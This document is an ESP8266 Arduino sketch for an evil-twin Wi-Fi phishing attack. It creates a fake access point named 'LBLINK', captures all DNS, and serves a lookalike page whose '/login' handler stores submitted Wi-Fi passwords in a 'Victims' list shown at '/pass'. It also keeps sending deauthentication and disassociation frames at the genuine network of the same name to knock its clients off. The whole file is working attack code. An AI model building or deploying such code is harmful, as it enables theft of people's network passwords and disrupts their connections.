// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

#define EMBED_STR(name, path)                            \
  extern const char name[];                              \
  asm(".section .rodata, \"a\", @progbits\n" #name ":\n" \
      ".incbin \"" path "\"\n"                           \
      ".byte 0\n"                                        \
      ".previous\n");

// User configuration
#define ATTACT_SSID_NAME "LBLINK"
EMBED_STR(INDEX_HTML, "lblink-min.html");

// System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const unsigned long TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);

String Victims = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName)
{
  String a = webServer.arg(argName);
  a.substring(0, 50);
  return a;
}

String pass()
{
  return "<ol>" + Victims + "</ol>";
}

String index()
{
  return INDEX_HTML;
}

String login()
{
  String password = input("password");
  Victims = "<li>Password:  <b>" + password + "</b></li>" + Victims;
  return INDEX_HTML;
}

void BLINK(int num)
{
  int count = 1;
  while (count <= num)
  {
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
    count = count + 1;
  }
}

/*
 * The packet has this structure:
 * 0-1:   type (C0 is deauth)
 * 2-3:   duration
 * 4-9:   receiver address (broadcast)
 * 10-15: source address
 * 16-21: BSSID
 * 22-23: sequence number
 * 24-25: reason code (1 is unspecified reason)
 */

uint8_t packet[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00};

uint8_t *bssid = nullptr;
int32_t channel = 0;

bool sendPacket(uint8_t *packet, uint16_t packetSize, uint8_t wifi_channel, uint16_t tries)
{

  wifi_set_channel(wifi_channel);

  bool sent = false;

  for (int i = 0; i < tries && !sent; i++)
    sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;

  return sent;
}

bool deauthDevice(uint8_t *mac, uint8_t wifi_channel)
{

  bool success = false;

  memcpy(&packet[10], mac, 6);
  memcpy(&packet[16], mac, 6);

  if (sendPacket(packet, sizeof(packet), wifi_channel, 2))
  {
    success = true;
  }

  // send disassociate frame
  packet[0] = 0xa0;

  if (sendPacket(packet, sizeof(packet), wifi_channel, 2))
  {
    success = true;
  }

  return success;
}

void setup()
{
  Serial.begin(115200);
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ATTACT_SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);

  int networksListSize = WiFi.scanNetworks();

  for (int i = 0; i < networksListSize; i++)
  {
    Serial.println("\n" + WiFi.SSID(i) + " " + WiFi.RSSI(i) + "\n");
    if (WiFi.SSID(i) == ATTACT_SSID_NAME)
    {
      bssid = WiFi.BSSID(i);
      channel = WiFi.channel(i);
    }
  }

  webServer.on("/login",
               []()
               {
                 webServer.send(HTTP_CODE, "text/html", login());
                 BLINK(3);
               });

  webServer.on("/pass",
               []()
               {
                 webServer.send(HTTP_CODE, "text/html", pass());
               });

  webServer.onNotFound(
      []()
      {
        lastActivity = millis();
        webServer.send(HTTP_CODE, "text/html", index());
      });

  webServer.begin();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
}

void loop()
{
  if ((millis() - lastTick) > TICK_TIMER)
  {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (bssid != nullptr && channel != 0)
  {
    deauthDevice(bssid, channel);
    BLINK(1);
    Serial.println("deauthDevice\n");
  }
}
